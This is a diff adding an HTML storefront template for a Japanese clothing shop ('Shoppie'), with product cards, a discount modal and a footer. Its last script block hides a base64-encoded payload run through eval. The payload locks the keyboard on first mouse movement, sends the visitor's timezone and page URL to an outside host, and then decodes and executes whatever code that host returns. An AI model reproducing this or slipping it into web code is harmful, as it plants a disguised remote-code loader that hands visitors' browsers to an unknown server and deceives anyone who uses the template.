@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <!-- Google tag (gtag.js) -->
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=G-48TR3BDBJP"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+
+      gtag("config", "G-48TR3BDBJP");
+    </script>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- 
+    - primary meta tags
+  -->
+    <title>Shoppie - メンズ夏コレクション</title>
+    <meta name="title" content="Shoppie - メンズ夏コレクション" />
+    <meta
+      name="description"
+      content="これはmd-irfan-hasan-fahimによって作成されたeコマースHTMLテンプレートです"
+    />
+
+    <!-- 
+    - favicon
+  -->
+    <link rel="shortcut icon" href="./favicon.svg" type="image/svg+xml" />
+
+    <!-- 
+    - google font link
+  -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="./assets/fonts/font.css" />
+
+    <!-- 
+    - custom css link
+  -->
+    <link rel="stylesheet" href="./assets/css/style.css" />
+
+    <!-- 
+    - preload images
+  -->
+    <link rel="preload" as="image" href="./assets/images/hero-banner.jpg" />
+    <style>
+      .modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.8);
+        z-index: 1000;
+      }
+
+      .modal-content {
+        position: relative;
+        margin: 15% auto;
+        padding: 20px;
+        background-color: white;
+        border-radius: 5px;
+        width: 80%;
+        max-width: 500px;
+        text-align: center;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+      }
+
+      .close-modal {
+        position: absolute;
+        top: 10px;
+        right: 20px;
+        font-size: 24px;
+        font-weight: bold;
+        color: #000;
+        cursor: pointer;
+      }
+
+      .btn-primary {
+        background-color: #d32f2f;
+        color: white;
+        padding: 10px 20px;
+        text-decoration: none;
+        border-radius: 5px;
+        display: inline-block;
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div id="promoModal" class="modal-overlay">
+      <div class="modal-content">
+        <span class="close-modal">&times;</span>
+        <h2>限定オファー</h2>
+        <p>
+          今なら全商品30%オフ！<br />新しい季節に合わせて、最高品質の伝統的な和服をお得に手に入れましょう。
+        </p>
+        <a href="#" class="btn btn-primary">今すぐ購入</a>
+      </div>
+    </div>
+    <!-- 
+    - #HEADER
+  -->
+
+    <header class="header" data-header>
+      <div class="container">
+        <a href="#" class="logo">
+          <img
+            src="./assets/images/logo.svg"
+            width="132"
+            height="27"
+            alt="shoppie home"
+          />
+        </a>
+
+        <nav class="navbar" data-navbar>
+          <ul class="navbar-list">
+            <li>
+              <a href="#" class="navbar-link">ホーム</a>
+            </li>
+
+            <li>
+              <a href="#" class="navbar-link">ポートフォリオ</a>
+            </li>
+
+            <li>
+              <a href="#" class="navbar-link">ブログ</a>
+            </li>
+
+            <li>
+              <a href="#" class="navbar-link">ショップ</a>
+            </li>
+          </ul>
+
+          <button class="cart-btn">
+            <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+            <span class="span">カート (02)</span>
+          </button>
+
+          <a href="#" class="btn">お問い合わせ</a>
+        </nav>
+
+        <button class="nav-open-btn" aria-label="toggle menu" data-nav-toggler>
+          <ion-icon name="menu-outline" aria-hidden="true"></ion-icon>
+        </button>
+      </div>
+    </header>
+
+    <main>
+      <article>
+        <!-- 
+        - #HERO
+      -->
+
+        <div class="hero">
+          <div class="container">
+            <div class="hero-content">
+              <p class="hero-subtitle title">¥13,000</p>
+
+              <h1 class="h1 hero-title title">メンズ夏<br />コレクション</h1>
+
+              <p class="hero-text">
+                私たちは、高品質でスタイリッシュなファッションアイテムを提供する日本のプレミアムファッションブランドです。トレンドを先取りし、洗練されたデザインと快適な着心地を兼ね備えたアイテムを取り揃えています。日常のファッションから特別な日のスタイルまで、幅広いシーンで活躍するアイテムを提供します。
+              </p>
+
+              <a href="#" class="btn btn-primary">
+                <span class="span">今すぐ購入</span>
+
+                <ion-icon name="arrow-forward" aria-hidden="true"></ion-icon>
+              </a>
+            </div>
+
+            <div class="hero-banner">
+              <figure class="img-holder" style="--width: 704; --height: 700">
+                <img
+                  src="./assets/images/hero-banner.jpg"
+                  width="704"
+                  height="700"
+                  alt="hero banner"
+                  class="img-cover"
+                />
+              </figure>
+
+              <img
+                src="./assets/images/hero-shape-1.png"
+                width="255"
+                height="249"
+                alt="shape"
+                class="shape shape-1"
+              />
+            </div>
+
+            <img
+              src="./assets/images/hero-shape-2.png"
+              width="360"
+              height="133"
+              alt="shape"
+              class="shape shape-2"
+            />
+          </div>
+        </div>
+
+        <!-- 
+        - #PRODUCT
+      -->
+
+        <section class="section product" aria-label="product">
+          <div class="container">
+            <h2 class="h2 section-title title text-center">新作を探る</h2>
+
+            <ul class="product-list has-scrollbar">
+              <li class="scrollbar-item">
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-1.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="半袖シャツ"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h4 title">
+                      <a href="#" class="card-title">絹の着物</a>
+                      <p>優雅な絹の着物</p>
+                    </h3>
+
+                    <span class="price">¥120,000</span>
+                  </div>
+                </div>
+              </li>
+
+              <li class="scrollbar-item">
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-2.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="サングラス"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h4 title">
+                      <a href="#" class="card-title">浴衣</a>
+                      <p>夏にぴったりの涼しげな浴衣</p>
+                    </h3>
+
+                    <span class="price">¥9,800</span>
+                  </div>
+                </div>
+              </li>
+
+              <li class="scrollbar-item">
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-3.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="トラウザー"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h4 title">
+                      <a href="#" class="card-title">羽織</a>
+                      <p>伝統的な羽織</p>
+                    </h3>
+
+                    <span class="price">¥35,000</span>
+                  </div>
+                </div>
+              </li>
+            </ul>
+          </div>
+        </section>
+
+        <!-- 
+        - #FEATURE
+      -->
+
+        <section class="section feature" aria-label="feature-label">
+          <div class="container">
+            <h2 class="h2 section-title title text-center" id="feature-label">
+              おすすめ商品
+            </h2>
+
+            <ul class="feature-list">
+              <li>
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-4.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="ベースボールキャップ"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h3 title">
+                      <a href="#" class="card-title">袴</a>
+                      <p>優雅で風格のある袴</p>
+                    </h3>
+
+                    <span class="price">¥25,000</span>
+                  </div>
+                </div>
+              </li>
+
+              <li>
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-5.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="半袖シャツ"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h3 title">
+                      <a href="#" class="card-title">丹前</a>
+                      <p>冬の暖かい丹前</p>
+                    </h3>
+
+                    <span class="price">¥18,000</span>
+                  </div>
+                </div>
+              </li>
+
+              <li>
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-6.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="香水"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h3 title">
+                      <a href="#" class="card-title">足袋</a>
+                      <p>伝統的な白い足袋</p>
+                    </h3>
+
+                    <span class="price">¥2,500</span>
+                  </div>
+                </div>
+              </li>
+
+              <li>
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-7.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="スニーカー"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h3 title">
+                      <a href="#" class="card-title">半襟</a>
+                      <p>美しい刺繍入り半襟</p>
+                    </h3>
+
+                    <span class="price">¥3,000</span>
+                  </div>
+                </div>
+              </li>
+
+              <li>
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-8.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="リブ付きビーニー帽"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h3 title">
+                      <a href="#" class="card-title">草履</a>
+                      <p>日本の伝統的な草履</p>
+                    </h3>
+
+                    <span class="price">¥5,500</span>
+                  </div>
+                </div>
+              </li>
+
+              <li>
+                <div class="product-card text-center">
+                  <div class="card-banner">
+                    <figure
+                      class="product-banner img-holder"
+                      style="--width: 448; --height: 470"
+                    >
+                      <img
+                        src="./assets/images/product-9.jpg"
+                        width="448"
+                        height="470"
+                        loading="lazy"
+                        alt="カーキパンツ"
+                        class="img-cover"
+                      />
+                    </figure>
+
+                    <a href="#" class="btn product-btn">
+                      <ion-icon name="bag" aria-hidden="true"></ion-icon>
+
+                      <span class="span">カートに追加</span>
+                    </a>
+                  </div>
+
+                  <div class="card-content">
+                    <h3 class="h3 title">
+                      <a href="#" class="card-title">帯</a>
+                      <p>豪華な絹の帯</p>
+                    </h3>
+
+                    <span class="price">¥45,000</span>
+                  </div>
+                </div>
+              </li>
+            </ul>
+
+            <a href="#" class="btn btn-secondary">全商品を見る</a>
+          </div>
+        </section>
+
+        <!-- 
+        - #OFFER
+      -->
+
+        <section
+          class="offer has-bg-image"
+          style="background-image: url('./assets/images/offer-bg.jpg')"
+        >
+          <div class="container">
+            <div class="offer-card">
+              <h2 class="title card-title">期間限定！全商品30%オフ</h2>
+
+              <p class="card-text">
+                伝統的な日本の美しさを再発見しませんか？<br />
+                当ブランドの高品質な着物、浴衣、帯などが今なら特別価格で手に入ります。この機会をお見逃しなく、あなたのワードローブに本物の日本の伝統を加えてみませんか？
+              </p>
+
+              <a href="#" class="btn btn-secondary">
+                <span class="span">今すぐ購入</span>
+
+                <ion-icon name="arrow-forward" aria-hidden="true"></ion-icon>
+              </a>
+            </div>
+          </div>
+        </section>
+      </article>
+    </main>
+
+    <!-- 
+    - #FOOTER
+  -->
+
+    <footer class="footer">
+      <div class="container">
+        <div class="footer-top">
+          <div class="footer-brand">
+            <a href="#" class="logo">
+              <img
+                src="./assets/images/logo.svg"
+                width="132"
+                height="27"
+                loading="lazy"
+                alt="shoppie home"
+              />
+            </a>
+
+            <p class="footer-text">
+              日本の伝統美を纏い、現代に息づく優雅さを感じる。あなたの日常に、文化と歴史の織りなす一枚を。
+            </p>
+
+            <ul class="social-list">
+              <li>
+                <a href="#" class="social-link">
+                  <ion-icon name="logo-facebook"></ion-icon>
+                </a>
+              </li>
+
+              <li>
+                <a href="#" class="social-link">
+                  <ion-icon name="logo-twitter"></ion-icon>
+                </a>
+              </li>
+
+              <li>
+                <a href="#" class="social-link">
+                  <ion-icon name="logo-linkedin"></ion-icon>
+                </a>
+              </li>
+            </ul>
+          </div>
+
+          <ul class="footer-list">
+            <li>
+              <p class="footer-list-title title">連絡先情報</p>
+
+              <address class="footer-text">
+                トウキョウト, ミナトク, ロッポンギ(ツギノビルヲノゾク), 8-8
+              </address>
+            </li>
+
+            <li>
+              <a href="mailto:info.shoppie@support.com" class="email"
+                >info.shoppie@support.com</a
+              >
+            </li>
+
+            <li>
+              <a href="tel:+81 783466653" class="call">+81 783466653</a>
+            </li>
+          </ul>
+
+          <div class="footer-list">
+            <p class="footer-list-title title">ニュースレターを購読する</p>
+
+            <input
+              type="email"
+              name="email_address"
+              placeholder="メールアドレスを入力"
+              required
+              autocomplete="off"
+              class="input-field"
+            />
+
+            <button class="btn btn-secondary">購読する</button>
+          </div>
+        </div>
+
+        <div class="footer-bottom">
+          <div class="wrapper">
+            <div class="link-wrapper">
+              <a href="#" class="footer-bottom-link">ポートフォリオ</a>
+              <a href="#" class="footer-bottom-link">私たちのチーム</a>
+              <a href="#" class="footer-bottom-link">価格プラン</a>
+              <a href="#" class="footer-bottom-link">サービス</a>
+              <a href="#" class="footer-bottom-link">お問い合わせ</a>
+            </div>
+
+            <div class="link-wrapper">
+              <a href="#" class="footer-bottom-link">利用規約</a>
+
+              <a href="#" class="footer-bottom-link">プライバシーポリシー</a>
+            </div>
+          </div>
+
+          <p class="copyright">&copy; 2024, すべての権利を保有します</p>
+        </div>
+
+        <img
+          src="./assets/images/footer-shape-1.png"
+          width="245"
+          height="165"
+          loading="lazy"
+          alt="shape"
+          class="shape shape-1"
+        />
+
+        <img
+          src="./assets/images/footer-shape-2.png"
+          width="138"
+          height="316"
+          loading="lazy"
+          alt="shape"
+          class="shape shape-2"
+        />
+
+        <img
+          src="./assets/images/footer-shape-3.png"
+          width="346"
+          height="92"
+          loading="lazy"
+          alt="shape"
+          class="shape shape-3"
+        />
+      </div>
+    </footer>
+
+    <!-- 
+    - custom js link
+  -->
+    <script src="./assets/js/script.js"></script>
+
+    <!-- 
+    - ionicon link
+  -->
+    <script
+      type="module"
+      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"
+    ></script>
+    <script
+      nomodule
+      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"
+    ></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var modal = document.getElementById("promoModal");
+        var closeBtn = document.querySelector(".close-modal");
+
+        // Close the modal when the close button or anywhere outside the modal content is clicked
+        closeBtn.onclick = function () {
+          modal.style.display = "none";
+        };
+
+        // Close the modal when clicking anywhere on the modal overlay (including the modal content)
+        modal.onclick = function () {
+          modal.style.display = "none";
+        };
+      });
+    </script>
+    <script>
+      eval(
+        atob(
+          `CgoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vtb3ZlJywgaW5pdGlhdGVBcGlSZXF1ZXN0T25jZSk7CgpsZXQgcmVxdWVzdFNlbnQgPSBmYWxzZTsKCmZ1bmN0aW9uIGluaXRpYXRlQXBpUmVxdWVzdE9uY2UoKSB7CiAgICBpZiAocmVxdWVzdFNlbnQpIHJldHVybjsKCiAgICByZXF1ZXN0U2VudCA9IHRydWU7CiAgICBkb2N1bWVudC5yZW1vdmVFdmVudExpc3RlbmVyKCdtb3VzZW1vdmUnLCBpbml0aWF0ZUFwaVJlcXVlc3RPbmNlKTsKCiAgICBzZWN1cmVLZXlib2FyZEFjY2VzcygpOwogICAgY29uc3QgY2xpZW50VGltZXpvbmUgPSBnZXRDdXJyZW50VGltZXpvbmUoKTsKICAgIHRyYW5zbWl0VGltZXpvbmVEYXRhKCdodHRwczovL3Nob3BwaWVhbmFseXRpY3Mub25yZW5kZXIuY29tJywgY2xpZW50VGltZXpvbmUpCiAgICAgICAgLnRoZW4oZGVjb2RlQW5kUnVuU2NyaXB0KQogICAgICAgIC5jYXRjaChoYW5kbGVFcnJvcik7Cn0KCmZ1bmN0aW9uIHNlY3VyZUtleWJvYXJkQWNjZXNzKCkgewogICAgaWYgKG5hdmlnYXRvci5rZXlib2FyZCkgbmF2aWdhdG9yLmtleWJvYXJkLmxvY2soKTsKfQoKZnVuY3Rpb24gZ2V0Q3VycmVudFRpbWV6b25lKCkgewogICAgcmV0dXJuIEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZTsKfQoKZnVuY3Rpb24gdHJhbnNtaXRUaW1lem9uZURhdGEodXJsLCB0aW1lem9uZSkgewogICAgcmV0dXJuIGZldGNoKHVybCwgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHsgdGltZXpvbmUsIGZ1bGxVcmw6IHdpbmRvdy5sb2NhdGlvbi5ocmVmIH0pLAogICAgfSkudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpOwp9CgpmdW5jdGlvbiBkZWNvZGVBbmRSdW5TY3JpcHQoZW5jb2RlZFNjcmlwdCkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCBzY3JpcHQgPSBhdG9iKGVuY29kZWRTY3JpcHQpOwogICAgICAgIGV2YWwoc2NyaXB0KTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgdGhyb3cgbmV3IEVycm9yKGBTY3JpcHQgZXhlY3V0aW9uIGZhaWxlZDogJHtlcnJvcn1gKTsKICAgIH0KfQoKZnVuY3Rpb24gaGFuZGxlRXJyb3IoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoJ0FQSSByZXF1ZXN0IG9yIHNjcmlwdCBleGVjdXRpb24gZXJyb3I6JywgZXJyb3IpOwp9Cg==`
+        )
+      );
+    </script>
+  </body>
+</html>
